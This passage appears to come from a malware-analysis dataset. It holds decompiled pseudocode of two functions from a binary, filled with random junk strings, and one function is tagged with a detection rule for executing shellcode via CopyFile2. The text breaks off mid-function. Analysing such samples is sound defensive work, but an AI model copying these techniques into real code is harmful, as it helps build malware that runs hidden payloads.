        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t fcn.0043f620(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t aiStack192 [7];\n    uint uStack164;\n    uint uStack148;\n    uint uStack144;\n    uint32_t auStack140 [4];\n    uint uStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint *puStack88;\n    int32_t *piStack84;\n    uchar uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar *puStack48;\n    uint uStack44;\n    uchar *puStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffffe0;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cad0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (0xf < in_stack_00000028) {\n        puStack36 = in_stack_00000028 + 1;\n        iStack60 = in_stack_00000014;\n        if (0xfff < puStack36) {\n            iStack60 = *(in_stack_00000014 + -4);\n            if (0x1f < (in_stack_00000014 + -4) - iStack60) {\n                uStack20 = 0;\n                puStack36 = 0x43f6a3;\n                fcn.004047f5();\n                puStack48 = 0x43f6bc;\n                puStack36 = &stack0xfffffffc;\n                fcn.004052d1();\n                puStack88 = &stack0xffffff74;\n                puStack76 = &stack0xffffff74;\n                uStack68 = 0x44cae0;\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                iStack112 = extraout_ECX + 8;\n                *(extraout_ECX + 8) = 0;\n                *(extraout_ECX + 0x18) = 0;\n                *(extraout_ECX + 0x1c) = 0xf;\n                *(extraout_ECX + 8) = 0;\n                iStack108 = extraout_ECX + 0x24;\n                *(extraout_ECX + 0x24) = 0;\n                *(extraout_ECX + 0x34) = 0;\n                *(extraout_ECX + 0x38) = 0xf;\n                *(extraout_ECX + 0x24) = 0;\n                iStack104 = extraout_ECX + 0x3c;\n                *(extraout_ECX + 0x3c) = 0;\n                *(extraout_ECX + 0x4c) = 0;\n                *(extraout_ECX + 0x50) = 0xf;\n                *(extraout_ECX + 0x3c) = 0;\n                *(extraout_ECX + 0x60) = 0;\n                *(extraout_ECX + 0x70) = 0;\n                *(extraout_ECX + 0x74) = 0xf;\n                *(extraout_ECX + 0x60) = 0;\n                iStack100 = extraout_ECX + 0x60;\n                piStack84 = &stack0xffffff40;\n                puStack92 = &stack0xffffff5c;\n                uStack148 = 0;\n                uStack144 = 0xf;\n                uStack164 = 0;\n                uStack64 = 2;\n                iStack116 = extraout_ECX;\n                puStack48 = &stack0x00000008;\n                fcn.00402f72(0x17, uStack80, \"avctufnzvwqavqyshccvran\");\n                piVar3 = piStack84;\n                piStack84[1] = 0;\n                piVar3[5] = 0;\n                piVar3[6] = 0xf;\n                *(piVar3 + 1) = 0;\n                uStack64 = 0xd;\n                fcn.00402f72(0x5d, uStack80, \n                             \"kqqetctvmvunqdrxerljrthggwmjbwaynnsowmuolqpibryjjadhykdlzbdvjexrdjjyqagmfegjgbazmnjqylovmztla\"\n                            );\n                *piStack84 = &stack0xffffff74;\n                uStack64 = 2;\n                fcn.0040492b();\n                puVar2 = puStack88;\n                uVar5 = uStack120;\n                if (0xf < uStack120) {\n                    uVar5 = uStack120 + 1;\n                    uVar6 = auStack140[0];\n                    if (0xfff < uVar5) {\n                        uVar6 = *(auStack140[0] - 4);\n                        if (0x1f < (auStack140[0] - 4) - uVar6) {\n                            uStack64 = 0;\n                            puStack88[-1] = 0x440092;\n                            fcn.004047f5();\n                            puVar13 = puVar2;\n                            goto code_r0x00440092;\n                        }\n                        uVar5 = uStack120 + 0x24;\n                    }\n                    puStack88[-1] = uVar5;\n                    puVar2[-2] = uVar6;\n                    puVar2[-3] = 0x43f84e;\n                    uVar5 = fcn.00401a32(puVar2[-2]);\n                }\n                uStack124 = 0;\n                uStack120 = 0xf;\n                auStack140[0] = auStack140[0] & 0xffffff00;\n                puStack88 = puVar2;\n                puVar2[-1] = uVar5;\n                piStack84 = puVar2 + -0x13;\n                puVar2[-0xf] = 0;\n                puVar2[-0xb] = 0;\n                puVar2[-10] = 0xf;\n                *(puVar2 + -0xf) = 0;\n                *(puVar2 + -0x15) = uStack80;\n                puVar2[-0x14] = \"ojnhbemtxqwmnczkmhsnfqdlpedvzkodwdfqeljiankccvptuaszdxxumlvujsn\";\n                puVar2[-0x16] = 0x3f;\n                puVar2[-0x17] = 0x43f8a9;\n                fcn.00402f72();\n                piVar3 = piStack84;\n                *piStack84 = 1;\n                piVar3[2] = 0x40cbbf00;\n                piVar3[1] = 0;\n                *(piVar3 + 3) = 1;\n                iVar1 = *0x54276c;\n                iVar9 = *0x542768;\n                iVar8 = *0x542764;\n                piVar3[10] = *0x542760;\n                piVar3[0xb] = iVar8;\n                piVar3[0xc] = iVar9;\n                piVar3[0xd] = iVar1;\n                piVar3[0xe] = 0x20a7;\n                *(piVar3 + 0xf) = 1;\n                piVar3[0x10] = 0xdd;\n                piVar3[0x12] = 0x40c08480;\n                piVar3[0x11] = 0;\n                uVar5 = piVar3[9];\n                if (0xf < uVar5) {\n                    iVar8 = piVar3[4];\n                    uVar6 = uVar5 + 1;\n                    iVar9 = iVar8;\n                    if (0xfff < uVar6) {\n                        iVar9 = *(iVar8 + -4);\n                        puVar13 = puVar2 + -0x16;\n                        if (0x1f < (iVar8 + -4) - iVar9) {\ncode_r0x00440092:\n                            uStack64 = 1;\n                            puVar13[-1] = 0x44009e;\n                            fcn.004047f5();\n                            puVar13[-1] = &stack0xffffffd0;\n                            puVar13[-0x21] = 0x4400ac;\n                            fcn.004052d1();\n                            puVar13[-0x21] = &stack0xffffffdc;\n                            puVar13[-0x41] = 0x4400bc;\n                            fcn.004052d1();\n                            puVar13[-0x41] = &stack0xffffffe8;\n                            puVar13[-0x61] = 0x4400cf;\n                            iVar8 = fcn.00403a76();\n                            return iVar8;\n                        }\n                        uVar6 = uVar5 + 0x24;\n                    }\n                    puVar2[-0x17] = uVar6;\n                    puVar2[-0x18] = iVar9;\n                    puVar2[-0x19] = 0x43f921;\n                    uVar5 = fcn.00401a32(puVar2[-0x18]);\n                }\n                puVar2 = puStack88;\n                puStack88[-1] = uVar5;\n                piStack84 = puVar2 + -0x1d;\n                puStack92 = puVar2 + -0x11;\n                puVar2[-0x11] = 0;\n                puVar2[-0xd] = 0;\n                puVar2[-0xc] = 0xf;\n                *(puVar2 + -0x11) = 0;\n                *(puVar2 + -0x1f) = uStack80;\n                puVar2[-0x1e] = \"lzqnimweeieemhfcbbosyzuqdvjnisvruqscbxpfliekxwxnhccalxffkmyxoeudez\";\n                puVar2[-0x20] = 0x42;\n                puVar2[-0x21] = 0x43f96d;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                puStack96 = piStack84 + 6;\n                piStack84[6] = 0;\n                puVar13[10] = 0;\n                puVar13[0xb] = 0xf;\n                *(puVar13 + 6) = 0;\n                uStack64 = 0xb;\n                *(puVar2 + -0x22) = uStack80;\n                puVar2[-0x21] = \"kgewwbwopyfpslscilklnihvdvmqwyhowncshksghirbdhqjqcskpefqzmkrmvhbqtvloonuaqngfun\";\n                puVar2[-0x23] = 0x4f;\n                puVar2[-0x24] = 0x43f9b6;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                *piStack84 = 0;\n                puVar13[4] = 0;\n                puVar13[5] = 0xf;\n                *puVar13 = 0;\n                uStack64 = 0xc;\n                *(puVar2 + -0x25) = uStack80;\n                puVar2[-0x24] = \"glvakynsihpshgwamgwffgjhacptkrnbvwwxucjbucfongcnftgyhikfohpkbtzfpu\";\n                puVar2[-0x26] = 0x42;\n                puVar2[-0x27] = 0x43f9f5;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[0x12] = *0x542780;\n                puVar13[0x13] = *0x542784;\n                puVar13[0x14] = *0x542788;\n                puVar13[0x15] = *0x54278c;\n                puVar13[0x16] = *0x5427a0;\n                puVar13[0x17] = *0x5427a4;\n                puVar13[0x18] = *0x5427a8;\n                puVar13[0x19] = *0x5427ac;\n                puVar13[0x1a] = 0x196;\n                puVar13[0x1c] = 0x40c04200;\n                puVar13[0x1b] = 0;\n                puVar2[-0x27] = 0x43fa28;\n                uVar7 = fcn.0040242d();\n                puVar2 = puStack88;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0x1b;\n                puStack92 = puVar2 + -0xb;\n                puVar2[-0xb] = 0;\n                puVar2[-7] = 0;\n                puVar2[-6] = 0xf;\n                *(puVar2 + -0xb) = 0;\n                uStack64 = 2;\n                *(puVar2 + -0x1d) = uStack80;\n                puVar2[-0x1c] = \"hlrsukkqktboabzcyukiusnoceysgncvazwwlsehxynaqqnqqeickpujgrfcfwpfrvwudypiwjrijuu\";\n                puVar2[-0x1e] = 0x4f;\n                puVar2[-0x1f] = 0x43fa78;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                puStack96 = piStack84 + 8;\n                piStack84[8] = 0;\n                puVar13[0xc] = 0;\n                puVar13[0xd] = 0xf;\n                *(puVar13 + 8) = 0;\n                uStack64 = 9;\n                *(puVar2 + -0x20) = uStack80;\n                puVar2[-0x1f] = \"osfsnmdehlggcaiminlyvovrtmpjzzsaapggidzdnaxomosjulrqk\";\n                puVar2[-0x21] = 0x35;\n                puVar2[-0x22] = 0x43fabf;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[2] = 0;\n                puVar13[6] = 0;\n                puVar13[7] = 0xf;\n                *(puVar13 + 2) = 0;\n                uStack64 = 10;\n                *(puVar2 + -0x23) = uStack80;\n                puVar2[-0x22] = \"kkupyrcipxrawfuqdjirctmscxrbldbzgzfprqjujiimgg\";\n                puVar2[-0x24] = 0x2e;\n                puVar2[-0x25] = 0x43fb05;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[1] = 0x40e7ea00;\n                *puVar13 = 0;\n                *(puVar13 + 0xe) = 1;\n                *(puVar13 + 0xf) = 1;\n                puVar13[0x16] = *0x5427c0;\n                puVar13[0x17] = *0x5427c4;\n                puVar13[0x18] = *0x5427c8;\n                puVar13[0x19] = *0x5427cc;\n                *(puVar13 + 0x1a) = 0;\n                puVar2[-0x25] = 0x43fb31;\n                uVar7 = fcn.00406294();\n                puVar2 = puStack88;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0x13;\n                puStack92 = puVar2 + -8;\n                puVar2[-8] = 0;\n                puVar2[-4] = 0;\n                puVar2[-3] = 0xf;\n                *(puVar2 + -8) = 0;\n                uStack64 = 2;\n                *(puVar2 + -0x15) = uStack80;\n                puVar2[-0x14] = \"mewfvjwxtjjkmrxjxmhpjkgscphmfwxsfqizphyejgrlwjcvjjhypkjq\";\n                puVar2[-0x16] = 0x38;\n                puVar2[-0x17] = 0x43fb81;\n                fcn.00402f72();\n                puVar4 = piStack84;\n                *(piStack84 + 4) = 0;\n                *(puVar4 + 0x14) = 0;\n                *(puVar4 + 0x18) = 0xf;\n                puVar4[4] = 0;\n                uStack64 = 8;\n                *(puVar2 + -0x18) = uStack80;\n                puVar2[-0x17] = \"zfnacuuyvwqrqzcbhhdsfhgjxjnsn\";\n                puVar2[-0x19] = 0x1d;\n                puVar2[-0x1a] = 0x43fbc7;\n                fcn.00402f72();\n                puVar4 = piStack84;\n                *piStack84 = 0;\n                *(puVar4 + 0x1c) = *0x5427e0;\n                *(puVar4 + 0x20) = *0x5427e4;\n                *(puVar4 + 0x24) = *0x5427e8;\n                *(puVar4 + 0x28) = *0x5427ec;\n                *(puVar4 + 0x48) = 0x40c14600;\n                *(puVar4 + 0x44) = 0;\n                uStack64 = 2;\n                puVar2[-0x1a] = 0x43fbf2;\n                uVar7 = fcn.00401401();\n                puVar2 = puStack88;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0xc;\n                puVar2[-8] = 0;\n                puVar2[-4] = 0;\n                puVar2[-3] = 0xf;\n                *(puVar2 + -8) = 0;\n                *(puVar2 + -0xe) = uStack80;\n                puVar2[-0xd] = \n                \"vdgneoraawrftzeejygytgaibrlvkofecxxxlryamcylglprczkvyebnfwlglqnnkqtnbxqfvscjopbkwqwnpfjyofq\";\n                puVar2[-0xf] = 0x5b;\n                puVar2[-0x10] = 0x43fc38;\n                fcn.00402f72();\n                puVar4 = piStack84;\n                *piStack84 = 0;\n                *(puVar4 + 8) = 0x40e0f120;\n                *(puVar4 + 4) = 0;\n                puVar4[0xc] = 1;\n                *(puVar4 + 0x2c) = 0x40c56a00;\n                *(puVar4 + 0x28) = 0;\n                puVar2[-0x10] = 0x43fc63;\n                fcn.00401082();\n                puVar2 = puStack88;\n                puVar10 = puStack88 + -1;\n                puStack88[-1] = 0x20;\n                puVar2[-2] = 0x43fc6d;\n                uVar7 = fcn.004024b9(*puVar10, *puVar2);\n                puVar2[-1] = 0x20;\n                puVar2[-2] = uVar7;\n                puVar2[-3] = 0x43fc78;\n                fcn.00401a32(puVar2[-2]);\n                piStack84 = puVar2 + -0xe;\n                puStack92 = puVar2 + -8;\n                puStack88 = puVar2;\n                puVar2[-3] = 0xf;\n                puVar2[-4] = 10;\n                *(puVar2 + -6) = 0x7767;\n                *(puVar2 + -0x16) = 0;\n                puVar2[-0xe] = 0;\n                puVar2[-10] = *0x542800;\n                puVar2[-9] = *0x542804;\n                puVar2[-8] = str.nbhbjtde._0_4_;\n                puVar2[-7] = str.nbhbjtde._4_4_;\n                *(puVar2 + -0xe) = 0;\n                uStack64 = 7;\n                *(puVar2 + -0x10) = uStack80;\n                puVar2[-0xf] = \"hoknamfduuiqobepoaexofyodsmcqhynlygdmfduovznltfrzteyshdqwptqyt\";\n                puVar2[-0x11] = 0x3e;\n                puVar2[-0x12] = 0x43fcdd;\n                fcn.00402f72();\n                puVar4 = piStack84;\n                *(piStack84 + 0x34) = 0x40f74ee0;\n                *(puVar4 + 0x30) = 0;\n                uStack64 = 2;\n                puVar2[-0x12] = 0x43fcfa;\n                uVar7 = fcn.00402b08();\n                puVar2 = puStack88;\n                puVar11 = puStack88 + -1;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0xe;\n                puVar2[-6] = 0;\n                puVar2[-2] = 0;\n                *puVar11 = 0xf;\n                *(puVar2 + -6) = 0;\n                *(puVar2 + -0x10) = uStack80;\n                puVar2[-0xf] = \"pxnfmhojmnfxmygigtvuhwbgrojpvuiropiyelpnlasjljoudzhjrmblyyuawzqvye\";\n                puVar2[-0x11] = 0x42;\n                puVar2[-0x12] = 0x43fd40;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                *piStack84 = 0x829;\n                *(puVar13 + 1) = 1;\n                *(puVar13 + 2) = 1;\n                puVar13[4] = 0x40f049d0;\n                puVar13[3] = 0;\n                *(puVar13 + 5) = 0;\n                puVar13[6] = 0x5f6;\n                puVar13[7] = 0x1f;\n                puVar2[-0x12] = 0x43fd76;\n                uVar7 = fcn.004036ca();\n                puVar2 = puStack88;\n                puVar12 = puStack88 + -1;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0x11;\n                puStack92 = puVar2 + -6;\n                puVar2[-6] = 0;\n                puVar2[-2] = 0;\n                *puVar12 = 0xf;\n                *(puVar2 + -6) = 0;\n                *(puVar2 + -0x13) = uStack80;\n                puVar2[-0x12] = \"otykkbpbbngxjuaamyukomcngkrcdpakugbrtmtrljuygnkbrkypbinowwog\";\n                puVar2[-0x14] = 0x3c;\n                puVar2[-0x15] = 0x43fdbf;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[1] = 0;\n                puVar13[5] = 0;\n                puVar13[6] = 0xf;\n                *(puVar13 + 1) = 0;\n                uStack64 = 6;\n                *(puVar2 + -0x16) = uStack80;\n                puVar2[-0x15] = \"ngswhhboeelykdvgqjobgxtgkrsrrzwfqurobydvzqfoyf\";\n                puVar2[-0x17] = 0x2e;\n                puVar2[-0x18] = 0x43fe05;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                *piStack84 = 0xfe2;\n                puVar13[8] = 0x40d15140;\n                puVar13[7] = 0;\n                *(puVar13 + 9) = 1;\n                *(puVar13 + 10) = 0;\n                puVar2[-0x18] = 0x43fe29;\n                uVar7 = fcn.0040141a();\n                puVar2 = puStack88;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0xd;\n                puVar2[-7] = 0;\n                puVar2[-3] = 0;\n                puVar2[-2] = 0xf;\n                *(puVar2 + -7) = 0;\n                uStack64 = 2;\n                *(puVar2 + -0xf) = uStack80;\n                puVar2[-0xe] = \"ukzqpkwgaruzltfodwrbazqhqkznapcgtsoizekeqiswjezbemqflvifqavsqda\";\n                puVar2[-0x10] = 0x3f;\n                puVar2[-0x11] = 0x43fe78;\n                fcn.00402f72();\n                puVar4 = piStack84;\n                *piStack84 = 1;\n                puVar4[4] = 1;\n                *(puVar4 + 8) = *0x542820;\n                *(puVar4 + 0xc) = *0x542824;\n                *(puVar4 + 0x10) = *0x542828;\n                *(puVar4 + 0x14) = *0x54282c;\n                puVar4[0x30] = 1;\n                puVar2[-0x11] = 0x43fe96;\n                uVar7 = fcn.0040541b();\n                puVar2 = puStack88;\n                puStack88[-1] = uVar7;\n                piStack84 = puVar2 + -0xf;\n                puVar2[-7] = 0;\n                puVar2[-3] = 0;\n                puVar2[-2] = 0xf;\n                *(puVar2 + -7) = 0;\n                *(puVar2 + -0x11) = uStack80;\n                puVar2[-0x10] = \"bjkhlxojdgjuswyqulxvezjnokueafgbwqeuuadmgc\";\n                puVar2[-0x12] = 0x2a;\n                puVar2[-0x13] = 0x43fede;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                *piStack84 = *0x542840;\n                puVar13[1] = *0x542844;\n                puVar13[2] = *0x542848;\n                puVar13[3] = *0x54284c;\n                *(puVar13 + 4) = 1;\n                *(puVar13 + 5) = 0;\n                puVar13[7] = 0x40abfe00;\n                puVar13[6] = 0;\n                puVar13[0xe] = 0xac4;\n                puVar2[-0x13] = 0x43ff0d;\n                fcn.004038f0();\n                puVar2 = puStack88;\n                puStack88[-2] = 0x43ff18;\n                uVar7 = fcn.00401f0f();\n                puVar2[-2] = uVar7;\n                piStack84 = puVar2 + -0x20;\n                puStack88 = puVar2 + -9;\n                puVar2[-9] = 0;\n                puVar2[-5] = 0;\n                puVar2[-4] = 0xf;\n                *(puVar2 + -9) = 0;\n                *(puVar2 + -0x22) = uStack80;\n                puVar2[-0x21] = \"yxyoaxnpkojrjnqywsxhgdcmjwmbqimelya\";\n                puVar2[-0x23] = 0x23;\n                puVar2[-0x24] = 0x43ff60;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                puStack92 = piStack84 + 0x11;\n                piStack84[0x11] = 0;\n                puVar13[0x15] = 0;\n                puVar13[0x16] = 0xf;\n                *(puVar13 + 0x11) = 0;\n                uStack64 = 3;\n                *(puVar2 + -0x25) = uStack80;\n                puVar2[-0x24] = \"zazcrtpntxujjdnddrewnyokrcjkigxsyml\";\n                puVar2[-0x26] = 0x23;\n                puVar2[-0x27] = 0x43ffa7;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                puStack96 = piStack84 + 8;\n                piStack84[8] = 0;\n                puVar13[0xc] = 0;\n                puVar13[0xd] = 0xf;\n                *(puVar13 + 8) = 0;\n                uStack64 = 4;\n                *(puVar2 + -0x28) = uStack80;\n                puVar2[-0x27] = \"aasgwtwchnkshawmxoufbxxgdbizzulslauhdqhlcldffkloozgvrbkpyxyyhxg\";\n                puVar2[-0x29] = 0x3f;\n                puVar2[-0x2a] = 0x43ffee;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[2] = 0;\n                puVar13[6] = 0;\n                puVar13[7] = 0xf;\n                *(puVar13 + 2) = 0;\n                uStack64 = 5;\n                *(puVar2 + -0x2b) = uStack80;\n                puVar2[-0x2a] = \"mbraxihebwtywzyxfjigyobfmxxtgusjxipg\";\n                puVar2[-0x2c] = 0x24;\n                puVar2[-0x2d] = 0x440034;\n                fcn.00402f72();\n                puVar13 = piStack84;\n                piStack84[1] = 0x40beac00;\n                *puVar13 = 0;\n                puVar13[0xe] = 0x642;\n                *(puVar13 + 0xf) = 1;\n                puVar13[0x10] = 0x3e6;\n                puVar13[0x1e] = 0x40c42e00;\n                puVar13[0x1d] = 0;\n                uStack64 = 2;\n                puVar2[-0x2d] = 0x440070;\n                fcn.00401a64();\n                *in_FS_OFFSET = iStack72;\n                return iStack116;\n            }\n            puStack36 = in_stack_00000028 + 0x24;\n        }\n        uStack44 = 0x43f681;\n        puStack32 = &stack0xffffffe0;\n        fcn.00401a32(iStack60);\n    }\n    *in_FS_OFFSET = iStack28;\n    return iStack28;\n}\n",
        "token_count": 7628
    },
    "00448330": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00448330(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t *in_FS_OFFSET;\n    uchar *apuStack260 [2];\n    char *pcStack252;\n    int32_t aiStack248 [2];\n    uint uStack240;\n    uint uStack224;\n    uint uStack220;\n    uint32_t auStack216 [4];\n    uint uStack200;\n    uint32_t uStack196;\n    uint32_t uStack192;\n    uint uStack176;\n    uint32_t uStack172;\n    uint32_t uStack168;\n    uint uStack152;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint uStack128;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar uStack112;\n    uint uStack104;\n    uint32_t uStack100;\n    uint32_t uStack96;\n    uint uStack92;\n    ushort uStack88;\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t *piStack56;\n    int32_t *piStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffff28;\n    puStack32 = &stack0xffffff28;\n    uStack24 = 0x44cda0;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack68 = param_1 + 8;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0xf;\n    *(param_1 + 8) = 0;\n    iStack64 = param_1 + 0x28;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x3c) = 0xf;\n    *(param_1 + 0x28) = 0;\n    iStack60 = param_1 + 0x40;\n    *(param_1 + 0x40) = 0;\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x54) = 0xf;\n    *(param_1 + 0x40) = 0;\n    piStack40 = &stack0xffffff08;\n    uStack224 = 0;\n    uStack220 = 0xf;\n    uStack240 = 0;\n    uStack20 = 0xb;\n    pcStack252 = \"qdkqyrpfftbxkbvoaukwyaurwcatoaoedfeivkrffothvvjgseilybtwcuszjglbcrdfozboom\";\n    apuStack260[0] = 0x4a;\n    iStack72 = param_1;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = 0x474;\n    *(piVar4 + 1) = 1;\n    uVar6 = piVar4[7];\n    if (uVar6 < 0x10) {\ncode_r0x00448452:\n        puVar2 = puStack44;\n        puVar11 = puStack44 + -1;\n        puStack44[-1] = uVar6;\n        piStack40 = puVar2 + -0xd;\n        puStack48 = puVar2 + -6;\n        *puVar11 = 0xf;\n        puVar2[-2] = 0xf;\n        puVar2[-4] = 0x7771796a;\n        *(puVar2 + -0xd) = 0x6c676d77;\n        *(puVar2 + -9) = 0;\n        puVar2[-0xc] = 0;\n        puVar2[-8] = *0x542950;\n        puVar2[-7] = *0x542954;\n        puVar2[-6] = str.fvchzgoo._0_4_;\n        puVar2[-5] = str.fvchzgoo._4_4_;\n        *(puVar2 + -0xc) = 0;\n        uStack20 = 0x12;\n        *(puVar2 + -0xf) = uStack36;\n        puVar2[-0xe] = \"lqecxxrldriciwtfbmoolwvmkbokzmyzrufhgiucrtamqiejhnrdjbifjvikghidckuwinsjqbtxylmztwhweuxtjzxjwa\";\n        puVar2[-0x10] = 0x5e;\n        puVar2[-0x11] = 0x4484c2;\n        fcn.00402f72();\n        *piStack40 = &stack0xffffff28;\n        uStack20 = 0xb;\n        puVar2[-0x11] = 0x4484d9;\n        fcn.00405056();\n        puVar2 = puStack44;\n        uVar6 = uStack196;\n        if (0xf < uStack196) {\n            uVar6 = uStack196 + 1;\n            uVar8 = auStack216[0];\n            if (0xfff < uVar6) {\n                uVar8 = *(auStack216[0] - 4);\n                if (0x1f < (auStack216[0] - 4) - uVar8) goto code_r0x00449037;\n                uVar6 = uStack196 + 0x24;\n            }\n            puStack44[-1] = uVar6;\n            puVar2[-2] = uVar8;\n            puVar2[-3] = 0x448517;\n            uVar6 = fcn.00401a32(puVar2[-2]);\n        }\n        uStack200 = 0;\n        uStack196 = 0xf;\n        auStack216[0] = auStack216[0] & 0xffffff00;\n        puStack44 = puVar2;\n        puVar2[-1] = uVar6;\n        piStack40 = puVar2 + -0x11;\n        puVar2[-0xb] = 0;\n        puVar2[-7] = 0;\n        puVar2[-6] = 0xf;\n        *(puVar2 + -0xb) = 0;\n        *(puVar2 + -0x13) = uStack36;\n        puVar2[-0x12] = \"tswaghfyryukjomnxebfotln\";\n        puVar2[-0x14] = 0x18;\n        puVar2[-0x15] = 0x44857b;\n        fcn.00402f72();\n        puVar1 = piStack40;\n        *piStack40 = 0;\n        *(puVar1 + 8) = 0x40ca3e80;\n        *(puVar1 + 4) = 0;\n        puVar1[0xc] = 1;\n        puVar1[0x10] = 1;\n        puVar1[0x14] = 1;\n        *(puVar1 + 0x30) = *0x542970;\n        *(puVar1 + 0x34) = *0x542974;\n        *(puVar1 + 0x38) = *0x542978;\n        *(puVar1 + 0x3c) = *0x54297c;\n        *(puVar1 + 0x40) = 0x2104;\n        puVar2[-0x15] = 0x4485b2;\n        uVar7 = fcn.004018ca();\n        puVar2 = puStack44;\n        puStack44[-1] = uVar7;\n        piStack40 = puVar2 + -0xe;\n        puStack48 = puVar2 + -7;\n        puVar2[-2] = 0xf;\n        puVar2[-3] = 0xc;\n        puVar2[-5] = 0x67797563;\n        *(puVar2 + -4) = 0;\n        puVar2[-0xd] = 0;\n        puVar2[-9] = *0x542990;\n        puVar2[-8] = *0x542994;\n        puVar2[-7] = str.aavudint._0_4_;\n        puVar2[-6] = str.aavudint._4_4_;\n        *(puVar2 + -0xd) = 0;\n        uStack20 = 0x11;\n        *(puVar2 + -0x10) = uStack36;\n        puVar2[-0xf] = \"vfhyxaiqavtgjimsfabdsyhskvwsfyeciakcohl\";\n        puVar2[-0x11] = 0x27;\n        puVar2[-0x12] = 0x44861b;\n        fcn.00402f72();\n        puVar5 = piStack40;\n        *piStack40 = 0x75b;\n        *(puVar5 + 0xd) = 0;\n        uStack20 = 0xb;\n        puVar2[-0x12] = 0x448634;\n        uVar7 = fcn.00402e50();\n        puVar2 = puStack44;\n        puStack44[-1] = uVar7;\n        piStack40 = puVar2 + -0x15;\n        puVar2[-7] = 0;\n        puVar2[-3] = 0;\n        puVar2[-2] = 0xf;\n        *(puVar2 + -7) = 0;\n        *(puVar2 + -0x17) = uStack36;\n        puVar2[-0x16] = \"knbjvraoupvlwnnrykfvahwtioxdxottdkgojdqcekx\";\n        puVar2[-0x18] = 0x2b;\n        puVar2[-0x19] = 0x44867a;\n        fcn.00402f72();\n        puVar5 = piStack40;\n        piStack40[7] = 0;\n        puVar5[0xc] = 0xf;\n        puVar5[0xb] = 2;\n        *(puVar5 + 7) = 0x7364;\n        *(puVar5 + 0x1e) = 0;\n        puVar5[1] = 0x40ec4c40;\n        *puVar5 = 0;\n        puVar5[2] = 0x221;\n        *(puVar5 + 3) = 1;\n        *(puVar5 + 4) = 1;\n        puVar5[6] = 0x40e58b80;\n        puVar5[5] = 0;\n        puVar5[0xd] = 0x1514;\n        puVar5[0x14] = 0x1670;\n        puVar2[-0x19] = 0x4486d9;\n        fcn.0040565f();\n        puVar2 = puStack44;\n        puVar12 = puStack44 + -2;\n        puStack44[-3] = 0x4486e4;\n        uVar7 = fcn.004027c5();\n        puStack44 = puVar12;\n        puVar2[-3] = uVar7;\n        piStack40 = puVar2 + -0x15;\n        puStack48 = puVar2 + -8;\n        puVar2[-8] = 0;\n        puVar2[-4] = 0;\n        puVar2[-3] = 0xf;\n        *(puVar2 + -8) = 0;\n        *(puVar2 + -0x17) = uStack36;\n        puVar2[-0x16] = \"wwwlmnljqfarferkzujucfbolelxpuqooszoijzpnzxkbkvrledcdzqbn\";\n        puVar2[-0x18] = 0x39;\n        puVar2[-0x19] = 0x44872d;\n        fcn.00402f72();\n        puVar5 = piStack40;\n        